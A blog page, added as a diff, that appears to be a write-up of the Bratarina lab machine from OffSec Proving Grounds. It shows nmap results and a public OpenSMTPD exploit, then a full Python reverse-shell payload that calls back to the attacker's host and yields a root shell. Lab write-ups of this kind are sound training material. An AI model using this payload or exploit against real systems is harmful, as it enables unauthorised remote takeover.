@@ -1,0 +1,156 @@
+<!DOCTYPE html>
+<html lang="en">
+
+<head><meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<meta http-equiv="X-UA-Compatible" content="ie=edge">
+<link href="https://fonts.googleapis.com/css?family=Merriweather:300|Raleway:400,700" rel="stylesheet">
+<link rel="stylesheet" href="/assets/css/style.css">
+<title>Proving grounds Play: Bratarina</title>
+<!-- Begin Jekyll SEO tag v2.8.0 -->
+<title>Proving grounds Play: Bratarina | Thevillagehacker’s Blog</title>
+<meta name="generator" content="Jekyll v4.3.3" />
+<meta property="og:title" content="Proving grounds Play: Bratarina" />
+<meta name="author" content="Naveen" />
+<meta property="og:locale" content="en_US" />
+<meta name="description" content="Offsec proving grounds practice linux machine writeup" />
+<meta property="og:description" content="Offsec proving grounds practice linux machine writeup" />
+<link rel="canonical" href="http://localhost:4000/2023/10/05/Proving_grounds_Practice-Bratarina.html" />
+<meta property="og:url" content="http://localhost:4000/2023/10/05/Proving_grounds_Practice-Bratarina.html" />
+<meta property="og:site_name" content="Thevillagehacker’s Blog" />
+<meta property="og:type" content="article" />
+<meta property="article:published_time" content="2023-10-05T02:00:00+05:30" />
+<meta name="twitter:card" content="summary" />
+<meta property="twitter:title" content="Proving grounds Play: Bratarina" />
+<script type="application/ld+json">
+{"@context":"https://schema.org","@type":"BlogPosting","author":{"@type":"Person","name":"Naveen"},"dateModified":"2023-10-05T02:00:00+05:30","datePublished":"2023-10-05T02:00:00+05:30","description":"Offsec proving grounds practice linux machine writeup","headline":"Proving grounds Play: Bratarina","mainEntityOfPage":{"@type":"WebPage","@id":"http://localhost:4000/2023/10/05/Proving_grounds_Practice-Bratarina.html"},"url":"http://localhost:4000/2023/10/05/Proving_grounds_Practice-Bratarina.html"}</script>
+<!-- End Jekyll SEO tag -->
+
+
+<script type="text/javascript" src="/assets/js/darkmode.js"></script>
+
+</head><body>
+  <main class="container">
+    <section class="about">
+      <div class="about-header condensed">
+      <div class="about-title">
+      <a href="/">
+        
+        <img src="/assets/portfolio.jpg" alt="Naveen Jagadeesan" />
+        
+      </a>
+      <h2 id="title">
+        <a href="/">Naveen Jagadeesan</a>
+      </h2>
+      </div><p class="tagline">Security Analyst. Security Researcher</p></div>
+      
+      <ul class="social about-footer condensed"><a href="https://github.com/thevillagehacker" target="_blank">
+          <li>
+            <i class="icon-github-circled"></i>
+          </li>
+        </a><a href="https://www.linkedin.com/in/thevillagehacker" target="_blank">
+          <li>
+            <i class="icon-linkedin-squared"></i>
+          </li>
+        </a><a href="https://twitter.com/thevillagehackr" target="_blank">
+          <li>
+            <i class="icon-twitter-squared"></i>
+          </li>
+        </a></ul><p class="about-footer condensed">&copy;
+        2024</p><div class="about-footer condensed">
+        <p>Dark Mode
+          <i class="icon-moon"></i>
+          <label class="switch">
+            <input type="checkbox" class="dark-mode-toggle">
+            <span class="slider round" onclick="toggleDarkMode()"></span>
+          </label>
+        </p>
+      </div>
+    </section>
+    <section class="content">
+      <div class="post-container">
+  <a class="post-link" href="/2023/10/05/Proving_grounds_Practice-Bratarina.html">
+    <h2 class="post-title">Proving grounds Play: Bratarina</h2>
+  </a>
+  <div class="post-meta">
+    <div class="post-date"><i class="icon-calendar"></i>Oct 5, 2023</div></div>
+  <div class="post">
+    <h2 id="nmap">Nmap</h2>
+
+<div class="language-text highlighter-rouge"><div class="highlight"><pre class="highlight"><code>PORT    STATE SERVICE     VERSION
+22/tcp  open  ssh         OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
+| ssh-hostkey: 
+|   2048 dbdd2cea2f85c589bcfce9a338f0d750 (RSA)
+|   256 e3b765c2a78e4529bb62ec301aebed6d (ECDSA)
+|_  256 d55b795bce48d85746db594fcd455def (ED25519)
+25/tcp  open  smtp        OpenSMTPD
+| smtp-commands: bratarina Hello nmap.scanme.org [192.168.45.212], pleased to meet you, 8BITMIME, ENHANCEDSTATUSCODES, SIZE 36700160, DSN, HELP
+|_ 2.0.0 This is OpenSMTPD 2.0.0 To report bugs in the implementation, please contact bugs@openbsd.org 2.0.0 with full details 2.0.0 End of HELP info
+80/tcp  open  http        nginx 1.14.0 (Ubuntu)
+|_http-title:         Page not found - FlaskBB        
+|_http-server-header: nginx/1.14.0 (Ubuntu)
+445/tcp open  netbios-ssn Samba smbd 4.7.6-Ubuntu (workgroup: COFFEECORP)
+Service Info: Host: bratarina; OS: Linux; CPE: cpe:/o:linux:linux_kernel
+</code></pre></div></div>
+
+<h2 id="25tcp--open--smtp---opensmtpd">25/tcp  open  smtp - OpenSMTPD</h2>
+
+<p>The service OpenSMTPD is vulnerable to <a href="https://www.exploit-db.com/exploits/47984">OpenSMTPD 6.6.1 - Remote Code Execution</a> vulnerability.</p>
+
+<h2 id="foothold">Foothold</h2>
+
+<div class="language-sh highlighter-rouge"><div class="highlight"><pre class="highlight"><code>naveenj@hackerspace:|22:38|~/proving_grounds/Bratarina/exploits<span class="nv">$ </span>python3 exploit.py 192.168.192.71 25 <span class="s1">'python -c "import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"192.168.45.212\",80));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty; pty.spawn(\"/bin/bash\")"'</span>
+<span class="o">[</span><span class="k">*</span><span class="o">]</span> OpenSMTPD detected
+<span class="o">[</span><span class="k">*</span><span class="o">]</span> Connected, sending payload
+<span class="o">[</span><span class="k">*</span><span class="o">]</span> Payload sent
+<span class="o">[</span><span class="k">*</span><span class="o">]</span> Done
+
+naveenj@hackerspace:|22:37|~/proving_grounds/Bratarina/exploits<span class="nv">$ </span>nc <span class="nt">-lvnp</span> 80
+listening on <span class="o">[</span>any] 80 ...
+connect to <span class="o">[</span>192.168.45.212] from <span class="o">(</span>UNKNOWN<span class="o">)</span> <span class="o">[</span>192.168.192.71] 34894
+root@bratarina:~# 
+</code></pre></div></div>
+
+<p><strong>Foothold Obtained</strong></p>
+
+<p>Thanks for reading!</p>
+
+<p>For more insights and updates, follow me on Twitter: <a href="https://twitter.com/thevillagehackr">@thevillagehacker</a>.</p>
+
+  </div></div>
+
+    </section>
+    <footer class="condensed">
+      <ul class="social about-footer condensed"><a href="https://github.com/thevillagehacker" target="_blank">
+          <li>
+            <i class="icon-github-circled"></i>
+          </li>
+        </a><a href="https://www.linkedin.com/in/thevillagehacker" target="_blank">
+          <li>
+            <i class="icon-linkedin-squared"></i>
+          </li>
+        </a><a href="https://twitter.com/thevillagehackr" target="_blank">
+          <li>
+            <i class="icon-twitter-squared"></i>
+          </li>
+        </a></ul><p class="about-footer condensed">&copy;
+        2024</p><div class="about-footer condensed">
+        <p>Dark Mode
+          <i class="icon-moon"></i>
+          <label class="switch">
+            <input type="checkbox" class="dark-mode-toggle">
+            <span class="slider round" onclick="toggleDarkMode()"></span>
+          </label>
+        </p>
+      </div>
+    </footer>
+  </main>
+  
+  <script type="text/javascript" src="/assets/js/darkmode.js"></script>
+  
+  <script src="/assets/js/simple-jekyll-search.min.js"></script>
+  <script src="/assets/js/search.js"></script>
+  
+</body>
+
+</html>
